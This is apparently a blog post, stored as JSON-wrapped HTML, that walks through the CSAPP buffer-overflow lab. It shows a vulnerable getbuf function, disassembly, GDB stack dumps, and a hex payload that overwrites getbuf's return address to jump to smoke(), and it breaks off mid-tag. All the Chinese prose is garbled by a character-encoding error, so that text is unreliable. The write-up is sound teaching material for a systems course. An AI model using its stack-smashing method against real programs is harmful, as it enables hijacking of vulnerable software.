{"data":{"title":"CSAPP LAB-3 ç¼“å†²åŒºæº¢å‡ºç‚¸å¼¹","slug":"CSAPP LABS/CSAPP LAB-3 ç¼“å†²åŒºæº¢å‡ºç‚¸å¼¹","description":"ç¼“å†²åŒºæº¢å‡ºæ”»å‡»å®éªŒ","date":"2024-05-26T07:38:09.000Z","updated":"2025-01-23T15:54:02.257Z","language":"zh-CN","comments":true,"url":"p/67787353/","cover":"https://cdn.gallery.uuanqin.top/img/202501232353097.webp","images":[],"content":"<p>æˆ‘å‘ç°æˆ‘åšçš„å®éªŒ 3 å’Œç½‘ä¸Šçš„éƒ½ä¸å¤ªä¸€æ ·ï¼Œéš¾é“è¿™å®éªŒæœ‰æ–°è€ç‰ˆæœ¬ä¹‹åˆ†ï¼Ÿä¸è¿‡ä¸»é¢˜éƒ½æ˜¯ä¸€è‡´çš„ï¼šåˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºçš„æ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p>\n\n<div class=\"callout\" data-callout=\"notice\">\n<div class=\"callout-title\">\n<div class=\"callout-title-icon\">\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-pencil\"><path d=\"M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z\"/><path d=\"m15 5 4 4\"/></svg>\n</div>\n<div class=\"callout-title-inner\">CSAPP LAB å®éªŒ</div>\n</div>\n<div class=\"callout-content\"><p></p>\n<ul>\n<li><a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/c5970284/\"><span class=\"yukari\">ç«™å†…æ–‡ç« </span>CSAPP LAB-1 ä½æ“ä½œ</a></li>\n<li><a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/d1f3cf37/\"><span class=\"yukari\">ç«™å†…æ–‡ç« </span>CSAPP LAB-2 äºŒè¿›åˆ¶ç‚¸å¼¹å®éªŒ</a></li>\n<li>CSAPP LAB-3 ç¼“å†²åŒºæº¢å‡ºç‚¸å¼¹ï¼ˆæœ¬æ–‡ï¼‰</li>\n<li><a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/9d6b717/\"><span class=\"yukari\">ç«™å†…æ–‡ç« </span>CSAPP LAB-4 ä»£ç ä¼˜åŒ–</a></li>\n<li><a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/3eb1abc7/\"><span class=\"yukari\">ç«™å†…æ–‡ç« </span>CSAPP LAB-5 æ‰‹å†™åŠ¨æ€å­˜å‚¨åˆ†é…å™¨</a></li>\n</ul>\n</div></div><p>å¦‚æœä½ æ›¾ç»åšè¿‡ Lab2ï¼Œé‚£ä¹ˆé˜…è¯»æ±‡ç¼–ä»£ç å°†ä¼šå¾ˆè½»æ¾ã€‚</p>\n<h1 id=\"å®éªŒç®€ä»‹\"><a class=\"markdownIt-Anchor\" href=\"#å®éªŒç®€ä»‹\"></a> å®éªŒç®€ä»‹</h1>\n<p>åç§°ï¼šç¼“å†²åŒºæº¢å‡ºç‚¸å¼¹</p>\n<p>å®éªŒä»£ç ï¼š</p>\n<ul>\n<li><code>makecookie</code>ï¼šç”Ÿæˆ cookieï¼Œåç»­å®éªŒç”¨åˆ°ï¼Œä»¥åˆ¤æ–­å®éªŒæ˜¯å¦æˆåŠŸã€‚ä¾‹ï¼š<code>./makecookie SA18225155</code> ç”Ÿæˆ cookie</li>\n<li><code>bufbomb</code>ï¼šå¯æ‰§è¡Œç¨‹åº - æ”»å‡»å¯¹è±¡</li>\n<li><code>sendstring</code>: å­—ç¬¦æ ¼å¼è½¬æ¢</li>\n</ul>\n<h2 id=\"bufbomb-ç¨‹åº\"><a class=\"markdownIt-Anchor\" href=\"#bufbomb-ç¨‹åº\"></a> bufbomb ç¨‹åº</h2>\n<p><code>bufbomb</code> ä¸­åŒ…å«ä¸€ä¸ª <code>getbuf</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°å®ç°å¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getbuf</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\"> \t<span class=\"type\">char</span> buf[<span class=\"number\">12</span>]; </span><br><span class=\"line\">\tGets(buf); </span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªå‡½æ•°å¯¹ buf æ²¡æœ‰è¶Šç•Œæ£€æŸ¥ï¼ˆè¿™æ˜¯å¸¸è§çš„ c ç¼–ç¨‹é”™è¯¯ï¼‰ï¼Œå½“è¾“å…¥è¶…è¿‡ 11 ä¸ªå­—ç¬¦å°†æº¢å‡ºã€‚æº¢å‡ºçš„å­—ç¬¦å°†è¦†ç›–æ ˆå¸§ä¸Šçš„æ•°æ®ï¼Œç‰¹åˆ«çš„ï¼Œä¼šè¦†ç›–ç¨‹åºè°ƒç”¨çš„è¿”å›åœ°å€ã€‚è¿™èµ‹äºˆæˆ‘ä»¬æ§åˆ¶ç¨‹åºæµç¨‹çš„èƒ½åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ æº¢å‡ºå­—ç¬¦ä¸²ï¼Œç¨‹åºå°†â€œè¿”å›â€è‡³æˆ‘ä»¬æƒ³è¦çš„ä»£ç ä¸Šã€‚</p>\n<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œåæ±‡ç¼–ï¼š</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objdump -d bufbomb &gt; bufbomb.s</span><br></pre></td></tr></table></figure>\n<p>è§‚å¯Ÿæ±‡ç¼–ä»£ç ï¼Œç»“åˆæ ˆå¸§ç»“æ„è¿›è¡Œç†è§£ï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>8048fe0 &lt;getbuf&gt;:</span><br><span class=\"line\"> <span class=\"number\">8048</span>fe0:\t<span class=\"number\">55</span>                   \tpush   %ebp         </span><br><span class=\"line\"> <span class=\"number\">8048</span>fe1:\t<span class=\"number\">89</span> e5                \tmov    %esp,%ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>fe3:\t<span class=\"number\">83</span> ec <span class=\"number\">18</span>             \tsub    $<span class=\"number\">0</span>x18,%esp       # ç¼“å†²åŒºåˆ†é…</span><br><span class=\"line\"> <span class=\"number\">8048</span>fe6:\t<span class=\"number\">8</span>d <span class=\"number\">45</span> f4             \tlea    -<span class=\"number\">0</span>xc(%ebp),%eax  # è¯·æ³¨æ„è¿™ä¸€è¡Œ</span><br><span class=\"line\"> <span class=\"number\">8048</span>fe9:\t<span class=\"number\">89</span> <span class=\"number\">0</span>4 <span class=\"number\">24</span>             \tmov    %eax,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>fec:\te8 <span class=\"number\">6</span>f fe ff ff       \tcall   <span class=\"number\">8048e60</span> &lt;Gets&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>ff1:\tb8 <span class=\"number\">0</span>1 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0       \tmov    $<span class=\"number\">0</span>x1,%eax</span><br><span class=\"line\"> <span class=\"number\">8048</span>ff6:\tc9                   \tleave  </span><br><span class=\"line\"> <span class=\"number\">8048</span>ff7:\tc3                   \tret    </span><br><span class=\"line\"> <span class=\"number\">8048</span>ff8:\t<span class=\"number\">90</span>                   \tnop</span><br><span class=\"line\"> <span class=\"number\">8048</span>ff9:\t<span class=\"number\">8</span>d b4 <span class=\"number\">26</span> <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tlea    <span class=\"number\">0</span>x0(%esi,%eiz,<span class=\"number\">1</span>),%esi</span><br></pre></td></tr></table></figure>\n<p><img src= \"/image/loading.gif\" data-lazy-src=\"https://cdn.gallery.uuanqin.top/img/20240526154709.webp\" alt=\"image.png\" width=\"300px\" /></p>\n<h2 id=\"sendstring-å­—ç¬¦ä¸²è½¬æ¢ç¨‹åº\"><a class=\"markdownIt-Anchor\" href=\"#sendstring-å­—ç¬¦ä¸²è½¬æ¢ç¨‹åº\"></a> sendstring å­—ç¬¦ä¸²è½¬æ¢ç¨‹åº</h2>\n<p>å®ƒçš„åŠŸèƒ½æ˜¯å°† 16 è¿›åˆ¶çš„æ•°æ®è½¬æ¢ä¸º ASCII å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š<code>41 42 43</code> è½¬æ¢ä¸º <code>ABC</code>ã€‚</p>\n<p>å› ä¸º <code>bufbomb</code> æ¥æ”¶çš„å‚æ•°æ˜¯ ASCII å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä½¿ç”¨äº†æ‰©å±•çš„ ASCII ç ï¼ˆ128~255ï¼‰éš¾ä»¥ç›´æ¥è¾“å…¥ã€‚</p>\n<p>æ‰€ä»¥å®éªŒçš„åŸºæœ¬æµç¨‹ä¸ºï¼š</p>\n<ul>\n<li>åœ¨ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ <code>exploit.txt</code> å†™å¥½åå…­è¿›åˆ¶æ•°æ®</li>\n<li>æ‰§è¡Œå‘½ä»¤å¾—åˆ°å­—ç¬¦æ–‡ä»¶ï¼š<code>./sendstring &lt; exploit.txt &gt; exploit-raw.txt </code></li>\n<li>è¿è¡Œ bufbomb ç¨‹åºï¼š<code>bufbomb -t &lt;your_number&gt; &lt; exploit-raw.txt</code>ã€‚<code>&lt;your_number&gt;</code> å¡«å†™ä½ çš„å­¦å·ä»¥éªŒè¯ cookieã€‚</li>\n</ul>\n<p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨è¾“å…¥ï¼ˆä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¾“å…¥ï¼‰çš„æ–¹å¼ï¼š<kbd>ALT</kbd>+ASC ç çš„åè¿›åˆ¶æ•°ï¼ˆå°é”®ç›˜è¾“å…¥ï¼‰ã€‚æ³¨æ„ï¼Œæœ€åä¸€ä¸ªæ•°å­—æŒ‰ä¸‹åä¸ ALT é”®åŒæ—¶æ”¾å¼€ã€‚ä¾‹å¦‚è¾“å…¥å­—ç¬¦â€œ1â€ä¸º ALT+49</p>\n<blockquote>\n<p>æˆ‘æ„Ÿè§‰æˆ‘ä»¬çš„å®éªŒæ—¶é˜‰å‰²ç‰ˆï¼Œä¸å¯ç”¨è¯„åˆ†ç³»ç»Ÿã€‚å’Œ Lab2 ä¸ä¸€æ ·çš„æ˜¯ï¼Œbufbomb æ˜¯è¿è¡Œ 1 æ¬¡è§£å¼€å¯¹åº” Levelã€‚å¦‚æœæœ‰ 4 ä¸ª Level æˆ‘ä»¬å¯èƒ½éœ€è¦å†™ 4 ä¸ª exploit.txtã€‚ä½†ä¸ç®¡æ€æ ·ï¼ŒåŸºæœ¬æ€è·¯æ˜¯ä¸€è‡´çš„ã€‚</p>\n</blockquote>\n<h2 id=\"gdb\"><a class=\"markdownIt-Anchor\" href=\"#gdb\"></a> GDB</h2>\n<p>GDB çš„ä½¿ç”¨è¯¦è§ï¼š<a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/d1f3cf37/\"><span class=\"yukari\">ç«™å†…æ–‡ç« </span>CSAPP LAB-2 äºŒè¿›åˆ¶ç‚¸å¼¹å®éªŒ</a>ã€‚è¿™é‡Œæ–°å­¦ä¸€ä¸ªå‘½ä»¤ï¼š<code>examine</code> æŸ¥çœ‹å†…å­˜åœ°å€ä¸­çš„å€¼ï¼ˆç®€å†™ä¸º <code>x</code>ï¼‰ã€‚<code>x</code> å‘½ä»¤çš„è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p>\n<p><code>x/&lt;n/f/u&gt; &lt;addr&gt;</code></p>\n<p><code>n</code>ã€<code>f</code>ã€<code>u</code> æ˜¯å¯é€‰çš„å‚æ•°ï¼š</p>\n<ul>\n<li><code>n</code> æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºæ˜¾ç¤ºå†…å­˜çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯è¯´ä»å½“å‰åœ°å€å‘åæ˜¾ç¤ºå‡ ä¸ªåœ°å€çš„å†…å®¹ã€‚</li>\n<li><code>f</code> è¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ï¼Œå‚è§ä¸Šé¢ã€‚å¦‚æœåœ°å€æ‰€æŒ‡çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯ <code>s</code>ï¼Œå¦‚æœ åœ°å€æ˜¯æŒ‡ä»¤åœ°å€ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯ iã€‚</li>\n<li><code>u</code> è¡¨ç¤ºä»å½“å‰åœ°å€å¾€åè¯·æ±‚çš„å­—èŠ‚æ•°ï¼Œå¦‚æœä¸æŒ‡å®šçš„è¯ï¼ŒGDB é»˜è®¤æ˜¯ 4 ä¸ª bytesã€‚<code>u</code> å‚æ•°å¯ä»¥ç”¨ä¸‹é¢çš„å­—ç¬¦æ¥ä»£æ›¿ï¼š<code>b</code> è¡¨ç¤ºå•å­—èŠ‚ï¼Œ<code>h</code> è¡¨ç¤ºåŒå­—èŠ‚ï¼Œ<code>w</code> è¡¨ç¤ºå››å­— èŠ‚ï¼Œ<code>g</code> è¡¨ç¤ºå…«å­—èŠ‚ã€‚å½“æˆ‘ä»¬æŒ‡å®šäº†å­—èŠ‚é•¿åº¦åï¼ŒGDB ä¼šä»æŒ‡å†…å­˜å®šçš„å†…å­˜åœ°å€å¼€å§‹ï¼Œè¯»å†™æŒ‡å®šå­—èŠ‚ï¼Œå¹¶æŠŠå…¶å½“ä½œä¸€ä¸ªå€¼å–å‡ºæ¥ã€‚</li>\n</ul>\n<p>ä¾‹å­ï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(gdb) x/<span class=\"number\">48</span>xb $ebp</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba40:     <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba48:     <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7    <span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba50:     <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48    <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x00</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba58:     <span class=\"number\">0</span>x78    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x1e    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba60:     <span class=\"number\">0</span>x03    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x9a    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba68:     <span class=\"number\">0</span>x84    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7</span><br></pre></td></tr></table></figure>\n<h2 id=\"ä¸€äº›æ±‡ç¼–æŒ‡ä»¤å‚è€ƒ\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€äº›æ±‡ç¼–æŒ‡ä»¤å‚è€ƒ\"></a> ä¸€äº›æ±‡ç¼–æŒ‡ä»¤å‚è€ƒ</h2>\n<p>ä¸ä¸€å®šå…¨éƒ½ç”¨åˆ°ï¼š</p>\n<ul>\n<li><code>call åœ°å€</code>ï¼šè¿”å›åœ°å€å…¥æ ˆï¼ˆç­‰ä»·äº <code>push %eipï¼›mov åœ°å€ï¼Œ%eip</code>ï¼›æ³¨æ„ <code>eip</code> æŒ‡å‘ä¸‹ä¸€æ¡å°šæœªæ‰§è¡Œçš„æŒ‡ä»¤ï¼‰</li>\n<li><code>ret</code>ï¼šä»æ ˆä¸­å¼¹å‡ºåœ°å€ï¼Œå¹¶è·³åˆ°é‚£ä¸ªåœ°å€ï¼ˆpop %eipï¼‰</li>\n<li><code>leave</code>ï¼šä½¿æ ˆåšå¥½è¿”å›å‡†å¤‡ï¼Œç­‰ä»·äº <code>mov %ebp, %esp; pop %ebp</code></li>\n<li><code>push</code>ï¼š<code>R[%esp]&lt;--R[%esp]-4;  M[R[%esp]]&lt;--S</code></li>\n<li><code>pop</code>:  <code>D&lt;--M[R[%esp]];   R[%esp]&lt;--R[%esp]+4;</code></li>\n</ul>\n<h1 id=\"å®éªŒå¼€å§‹\"><a class=\"markdownIt-Anchor\" href=\"#å®éªŒå¼€å§‹\"></a> å®éªŒå¼€å§‹</h1>\n<h2 id=\"level-0-èœ¡çƒ›\"><a class=\"markdownIt-Anchor\" href=\"#level-0-èœ¡çƒ›\"></a> Level 0 - èœ¡çƒ›</h2>\n<blockquote>\n<p>æœ¬å±‚è€ƒå¯Ÿåœ°å€è·³è½¬ã€‚</p>\n</blockquote>\n<p>ç‚¸å¼¹çš„ä¸»ä½“å‡½æ•° <code>test</code> ä¸ºï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">test</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\t<span class=\"type\">int</span> val; </span><br><span class=\"line\">\t<span class=\"keyword\">volatile</span> <span class=\"type\">int</span> local = <span class=\"number\">0xdeadbeef</span>; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">3</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\">\tval = getbuf(); <span class=\"comment\">// getbufå‡½æ•°åœ¨testä¸­è¢«è°ƒç”¨ï¼Œå½“getbufè¿”å›æ—¶ç»§ç»­æ‰§è¡Œåç»­å†…å®¹</span></span><br><span class=\"line\">\t<span class=\"comment\">/* Check for corrupted stack */</span> </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (local != <span class=\"number\">0xdeadbeef</span>) &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Sabotaged!: the stack has been corrupted\\n&quot;</span>); </span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (val == cookie) &#123; </span><br><span class=\"line\">\t\t...\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>æ­£å¸¸è¿è¡Œçš„ç»“æœä¸ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string: &lt;éšä¾¿è¾“å…¥å°äº11ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²&gt;</span><br><span class=\"line\">Better luck next time</span><br></pre></td></tr></table></figure>\n<p><code>smoke</code> æ˜¯ <code>bufbomb</code> ä¸­ä¸€ä¸ªæ­£å¸¸æƒ…å†µä¸‹ä¸ä¼šè¢«æ‰§è¡Œçš„å‡½æ•°ï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">smoke</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">0</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Smoke!: You called smoke()\\n&quot;</span>); </span><br><span class=\"line\">\tvalidate(<span class=\"number\">0</span>); </span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>); </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>æˆ‘ä»¬çš„ç›®æ ‡ï¼šåœ¨ <code>getbuf</code> è¿”å›æ—¶è·³åˆ° <code>smoke</code> å‡½æ•°æ‰§è¡Œã€‚</p>\n<p>æ€è·¯ï¼š</p>\n<ul>\n<li>é€šè¿‡è°ƒè¯•å¾—åˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²é¦–åœ°å€ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²ä½œéªŒè¯ <code>x/s $ebp-0xc</code></li>\n<li>æ‰¾åˆ°å‡½æ•° <code>smoke</code> çš„åœ°å€ <code>p/x &amp;smoke</code>ï¼›æˆ–è€…ç›´æ¥åœ¨åç¼–è¯‘æ–‡ä»¶ä¸­æœç´¢ <code>smoke</code> å‡½æ•°åœ°å€å³å¯ã€‚</li>\n<li>ç”¨ <code>smoke</code> å‡½æ•°çš„åœ°å€è¦†ç›– <code>getbuf</code> çš„è¿”å›åœ°å€ã€‚</li>\n</ul>\n<p>æˆ‘ä»¬å…ˆç®€å•æµ‹è¯•ä¸€ä¸ªä¸ä¼šé€ æˆç¼“å†²åŒºæº¢å‡ºçš„æ­£å¸¸å­—ç¬¦ä¸²ï¼š<code>41 42 43 44 45 46 47 48 49 4a 4b</code> 11 ä¸ªå­—ç¬¦åŠ ä¸Šæœ«å°¾ <code>\\0</code>ã€‚</p>\n<p>GDB è°ƒè¯•ï¼Œåœ¨ getbuf å‡½æ•°è¿”å›å‰ï¼Œæ£€æŸ¥%espï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">; (gdb) p /x $esp</span><br><span class=\"line\">; $<span class=\"number\">2</span> = <span class=\"number\">0</span>xffffba40  â©</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) p /x $ebp</span><br><span class=\"line\">$<span class=\"number\">9</span> = <span class=\"number\">0</span>xffffba58  â–¶ </span><br><span class=\"line\"></span><br><span class=\"line\">; (gdb) x/<span class=\"number\">48</span>xb $esp</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba40:â©  <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba48:     <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7    ğŸ˜€<span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba50:     <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48    <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x00ğŸ˜‰</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba58:â–¶  <span class=\"number\">0</span>x78    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    â¤<span class=\"number\">0</span>x1e    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08â¤ </span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba60:     <span class=\"number\">0</span>x03    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x9a    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba68:     <span class=\"number\">0</span>x84    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7</span><br></pre></td></tr></table></figure>\n<p>ğŸ˜€æ ‡è®°å¤„ï¼Œä¹Ÿå°±æ˜¯æ±‡ç¼–ä»£ç ä¸­çš„ <code>-0xc(%ebp)</code> å°±æ˜¯ç¼“å†²åŒºå¼€å§‹åœ°å€ã€‚ğŸ˜‰æ ‡è®°ç¼“å†²åŒºç»“æŸçš„ä½ç½®ã€‚</p>\n<p>â¤æ ‡è®°çš„ <code>0x1e    0x90    0x04    0x08</code> æ˜¯åœ°å€Â <code>0x0804901e</code> å°ç«¯ç¼–ç åçš„ç»“æœï¼ŒæŒ‡å‘è¿”å› test åœ°å€ï¼ˆå› ä¸º test è°ƒç”¨ getbufï¼‰ã€‚</p>\n<p>é‚£æˆ‘ä»¬åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºå–è¦†ç›–æ‰è¿™ä¸ªåœ°å€å°±è¡Œï¼Œè®©ä»–æŒ‡å‘ smoke å‡½æ•°ã€‚è§‚å¯Ÿåæ±‡ç¼–çš„ä»£ç  <code>bufbomb.s</code> å®¹æ˜“çŸ¥é“ smoke å‡½æ•°åœ°å€ä¸ºï¼š<code>0x08048e20</code>ï¼Œå°ç«¯å†™æ³•ï¼š<code>20 8e 04 08</code>ã€‚æ‰€ä»¥ï¼Œ<code>exploit0.txt</code> ä¸ºï¼š</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 20 8e 04 08</span><br></pre></td></tr></table></figure>\n<p>gdb é‡æ–°è¿è¡Œ bufbomb æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿæ³¨å…¥åçš„æ ˆå¸§ï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">; æ³¨å…¥åï¼š</span><br><span class=\"line\">; (gdb) x/<span class=\"number\">48</span>xb $esp</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba40:â©  <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7</span><br><span class=\"line\">; <span 